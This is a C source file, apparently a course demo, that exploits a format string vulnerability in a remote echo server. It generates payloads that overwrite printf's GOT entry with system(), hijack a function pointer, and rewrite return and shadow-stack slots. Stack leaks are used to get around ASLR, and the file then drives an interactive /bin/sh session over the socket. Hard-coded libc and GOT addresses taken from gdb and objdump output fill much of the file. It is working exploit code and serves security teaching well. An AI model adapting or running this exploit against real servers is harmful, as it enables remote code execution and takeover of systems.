/***********************************************************************
				A demo to show how to overwrite GOT entry and Function Pointer
	(1) GOT_WRITE_FMT_STR for GOT overwrite
	(2) FUNC_PTR_FMT_STR for subverting Function Pointer.
	(3) Generate a vulnerable format string to attack remote server.
	
	sheisc@163.com
************************************************************************/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 

#include "util.h"

#define	GOT_WRITE_FMT_STR		1
#define	FUNC_PTR_FMT_STR		2
#define SHADOW_STACK_FMT_STR	3
#define EMULATE_BUFFER_OVERFLOW_FMT_STR 4


#define SS_OFFSET       (16L << 20)


// By default, ASLR is deployed,
// which can be bypassed via information disclosure.
// In fact,by exploiting a format string vulnerability,
// an attacker can read anything readable and write anything writable.
// For example, we can inject "/bin/sh" into the data section of the server via the format string vulnerability.
// But, for simplicity, we reuse the exisitng "/bin/sh" in the server and its NON-randomized address is hard-coded here.
// 
/*
	(gdb) b 44
	Breakpoint 1 at 0x804a8af: file server.c, line 44.

	(gdb) p printf
	$1 = {<text variable, no debug info>} 0xf7e33020 <printf>


	(gdb) p system
	$2 = {<text variable, no debug info>} 0xf7e24940 <system>


iron@CSE:~$ cat /proc/13312/maps
f7dea000-f7f97000 r-xp 00000000 08:01 541674                             /lib32/libc-2.23.so

	(gdb) find 0xf7dea000,0xf7f97000, "/bin/sh"
	0xf7f4302b
	1 pattern found.

 */
#define SERVER_R4_SYSTEM_FUNC_ADDR	0xf7e24940
#define SERVER_R4_SHELL_STR_ADDR	0xf7f4302b
#define SERVER_R4_PRINTF_FUNC_ADDR	0xf7e33020

/*
iron@CSE:echo$ objdump -R server.R4 | grep printf
0804c014 R_386_JUMP_SLOT   printf@GLIBC_2.0
 */
#define SERVER_R4_PRINTF_GOT_ADDR	0x0804c014

/*
(gdb) i address sbuf
Symbol "sbuf" is static storage at address 0x804c0a8.
(gdb) i address fptr
Symbol "fptr" is static storage at address 0x804c128.
 */
#define SERVER_R4_SBUF_ADDR			0x804c0a8
#define SERVER_R4_FPTR_ADDR			0x804c128

/*
Thread 2.1 "server.R4" hit Breakpoint 1, read_and_echo () at server.c:44





//////////////////////////////////////////////////////////////////////////////
	// (SS_OFFSET)
	subl	$16777216, %esp
	pushl	.unsw.retid+32
	// (SS_OFFSET+4)
	addl	$16777220, %esp
	calll	read_and_echo


0x804a8bc <read_and_echo+76>    mov    -0x1000000(%esp),%edx                                                                                                                                                   │
0x804a8c3 <read_and_echo+83>    add    $0x4,%esp                                                                                                                                                               │
0x804a8c6 <read_and_echo+86>    jmp    *0x804e170(,%edx,4)  


Thread 2.1 "server.R4" hit Breakpoint 1, read_and_echo () at server.c:44
44	}
(gdb) p $ebp
$3 = (void *) 0xffffca18
(gdb) x /xw $ebp
0xffffca18:	0xffffca28

(gdb) bt
#0  read_and_echo () at server.c:44
#1  0x0804a77f in do_request () at server.c:49
#2  0x0804a700 in service (clfd=4) at server.c:72
#3  0x0804a5e1 in main (argc=2, argv=0xffffce14) at server.c:130
 */


#define SERVER_R4_NON_ASLR_EBP_read_and_echo			0xffffca18UL
#define SERVER_R4_NON_ASLR_EBP_do_request				0xffffca28UL
// 0xffffcc90
#define SERVER_R4_NON_ASLR_ADDR_OF_RET_SLOT		(SERVER_R4_NON_ASLR_EBP_read_and_echo + 4)			

/*
objdump -d server.R4 > ~/server.R4.txt

080493a0 <do_request>:
 80493a0:	55                   	push   %ebp
 80493a1:	89 e5                	mov    %esp,%ebp
 80493a3:	83 ec 08             	sub    $0x8,%esp
 80493a6:	eb 00                	jmp    80493a8 <do_request+0x8>
 80493a8:	81 ec 00 00 00 01    	sub    $0x1000000,%esp
 80493ae:	ff 35 00 c1 04 08    	pushl  0x804c100
 80493b4:	81 c4 04 00 00 01    	add    $0x1000004,%esp
 80493ba:	e8 31 00 00 00       	call   80493f0 <read_and_echo>

 */
#define SERVER_R4_NON_ASLR_ADDR_OF_SHADOW_STACK_OFFSET	0x080493aa


static struct server_info s_info = {
	.system_func_addr = SERVER_R4_SYSTEM_FUNC_ADDR,
	.shell_str_addr = SERVER_R4_SHELL_STR_ADDR,
	.printf_got_addr = SERVER_R4_PRINTF_GOT_ADDR,
	.stack_lifting = STACK_LIFTING_CNT,
	.printf_func_addr = SERVER_R4_PRINTF_FUNC_ADDR,
};

void printAddrsAndVals(unsigned *addrs, unsigned *vals, int count){
	for(int i = 0; i < count; i++){
#if 0	
		unsigned short * sVal = (unsigned short *)&vals[i];
		printf("write a value %u to memory at 0x%08x\n", sVal[0], addrs[i]);
		printf("write a value %u to memory at 0x%08x\n", sVal[1], addrs[i]+2);
#endif
		printf("write a value 0x%08x to the address 0x%08x\n", vals[i], addrs[i]);
	}
}

static int gen_evil_fmt_str(char * pl_buf, int size, int choice, int sock){	
	//printf("choice is %d \n", choice);

	// Attack vector One: to manipulate GOT entry	
	if(choice == GOT_WRITE_FMT_STR){

	
		// Generate format string to subvert the GOT entry of printf.
		unsigned int got_addrs[] = {s_info.printf_got_addr};
		unsigned int got_vals[] = {s_info.system_func_addr };		

		gen_payload(pl_buf,size,"",got_addrs,got_vals,
						sizeof(got_addrs)/sizeof(got_addrs[0]),s_info.stack_lifting);		
					

	}else if(choice == FUNC_PTR_FMT_STR){// Attack vector Two: to overwrite function pointers

		// Generate format string to modify the fptr and sbuf in the server process
		// sbuf is at 0x804a080 while fptr is at 0x804a0b4.
		//	system("/bin/sh");	
		/*
		(gdb) i address sbuf
		Symbol "sbuf" is at 0x804a0a0 in a file compiled without debugging.
		(gdb) i address fptr
		Symbol "fptr" is at 0x804a0d0 in a file compiled without debugging.
		 */	
		unsigned int target_data_addr = SERVER_R4_SBUF_ADDR;//0x804a080;
		unsigned int target_ptr_addr = SERVER_R4_FPTR_ADDR;//0x804a0b4;
		unsigned int target_addrs[] = {target_data_addr,target_data_addr+4,target_ptr_addr};
		// 0x6E69622F,0x0068732F is ASCII code of "/bin/sh"
		unsigned int target_vals[] = {0x6E69622F,0x0068732F,s_info.system_func_addr};
		
		gen_payload(pl_buf,size,"",target_addrs,target_vals,
						sizeof(target_addrs)/sizeof(target_addrs[0]),s_info.stack_lifting);
			
	}else {
		/*
			See makefile.
			It seems that the code generated by clang by default does not contain
			stack canary. 
			By contrast, the code emitted by gcc contains stack canary by default.

			
			arg 			=>	 address of "/bin/sh" for system()
			arg             =>   fake return address of system() called later
			saved_ret_addr	=>   corrupt its peer in stack stack with addr of system()
			saved_ebp
		 */	
		int ebp_pos = (CANARY_POSITION/4) + s_info.stack_lifting+ 1;
		int ret_pos = ebp_pos + 1;


		unsigned int saved_ebp = peek_x86_stack(sock,ebp_pos);
		// ebp_pos + 1 is used for stack lifting (ebp_pos + 1) * 4 bytes
		unsigned int saved_ret_addr = peek_x86_stack(sock,ebp_pos + 1);
		unsigned int addr_of_ret_slot =  (saved_ebp - SERVER_R4_NON_ASLR_EBP_do_request) 
											+ SERVER_R4_NON_ASLR_ADDR_OF_RET_SLOT;

		unsigned int addr_of_fake_ret_slot = addr_of_ret_slot + 4;											
		unsigned int addr_of_fake_arg = addr_of_ret_slot + 8;	

		int offset = 0;
		peek_remote_server(sock, SERVER_R4_NON_ASLR_ADDR_OF_SHADOW_STACK_OFFSET, (char *)&offset, sizeof(offset));
		
		printf("Shadow stack offset is 0x%08x \n", offset);

		//unsigned int addr_of_ret_slot_in_ss = addr_of_ret_slot - SS_OFFSET;
		unsigned int addr_of_ret_slot_in_ss = addr_of_ret_slot - offset;

		printf("saved ebp:  0x%x ; saved ret: 0x%x \n",saved_ebp, saved_ret_addr);										
	 	printf("addr_of_ret_slot is at 0x%x \n",addr_of_ret_slot);
	 	printf("addr_of_fake_ret_slot is at 0x%x \n",addr_of_fake_ret_slot);
	 	printf("addr_of_ret_slot_in_ss is at 0x%x \n\n",addr_of_ret_slot_in_ss);

	 	int ret_id = 0;
	 	peek_remote_server(sock, addr_of_ret_slot_in_ss, (char *)&ret_id, sizeof(ret_id));
	 	printf("ret_id is 0x%x \n\n",ret_id);
#if 0	 // peek_remote_server() needs to be FIXed. The waiting time needs to be adjusted.	
#define LEN_TO_PEEK  32	 	
	 	//FIXME: buffer overflow :)
	 	int n = 0;	 	
	 	char buf[LEN_TO_PEEK];	
	 	memset(buf,0,sizeof(buf));
	 	n = peek_remote_server(sock, addr_of_ret_slot_in_ss, buf, sizeof(buf));
	 	print_bytes(buf,n);
	 	printf("%d bytes read\n", n);
#endif
#if 1 	
		if(choice == SHADOW_STACK_FMT_STR){
		 	unsigned int target_addrs[] = {addr_of_ret_slot_in_ss, addr_of_fake_ret_slot, addr_of_fake_arg};
			unsigned int target_vals[] = {9527, saved_ret_addr, s_info.shell_str_addr};
			
			printAddrsAndVals(target_addrs, target_vals, sizeof(target_vals)/sizeof(target_vals[0]));
			gen_payload(pl_buf,size,"",target_addrs,target_vals,
							sizeof(target_addrs)/sizeof(target_addrs[0]),s_info.stack_lifting);
		}else{ // EMULATE_BUFFER_OVERFLOW_FMT_STR
			unsigned int target_addrs[] = {addr_of_ret_slot, addr_of_fake_ret_slot, addr_of_fake_arg};
			unsigned int target_vals[] = {s_info.system_func_addr, saved_ret_addr, s_info.shell_str_addr};
			
			printAddrsAndVals(target_addrs, target_vals, sizeof(target_vals)/sizeof(target_vals[0]));
			gen_payload(pl_buf,size,"",target_addrs,target_vals,
							sizeof(target_addrs)/sizeof(target_addrs[0]),s_info.stack_lifting);
		}
#endif	
		// unsigned int target_addrs[] = {addr_of_ret_slot_in_ss, addr_of_fake_ret_slot, addr_of_fake_arg};
		// unsigned int target_vals[] = {8189, saved_ret_addr, s_info.shell_str_addr};
			
		// gen_payload(pl_buf,size,"",target_addrs,target_vals,
		// 					sizeof(target_addrs)/sizeof(target_addrs[0]),s_info.stack_lifting);					
	}	

	return 0;
}

static int choice = SHADOW_STACK_FMT_STR;

void request(int sock){	
	char buf[4096];
	int n;
	
	disclose_info(sock,&s_info);

	//printf("%d: content = 0x%x \n",i, content);

	// for(int i = ebp_pos; i < ebp_pos + 32; i++){
	// 	int content = peek_x86_stack(sock,i);
	// 	printf("%d: content = 0x%x \n",i, content);
	// }


	gen_evil_fmt_str(buf,sizeof(buf),choice,sock);
	strcat(buf,"\n");
	printf("%s \n",buf);
	n = in_place_escape(buf,strlen(buf));
	//Send the vulnerable format string
	send(sock, buf, n, 0);
	get_and_prt(sock,WITHOUT_OUTPUT);
	//
	REPL(sock,WITH_NORMAL_OUTPUT);
}

int main(int argc, char **argv){
	if(argc >= 4){
		choice = atoi(argv[3]);	
		printf("choice = %d \n",choice);	
	}
	return do_it(argc,argv,request);
}

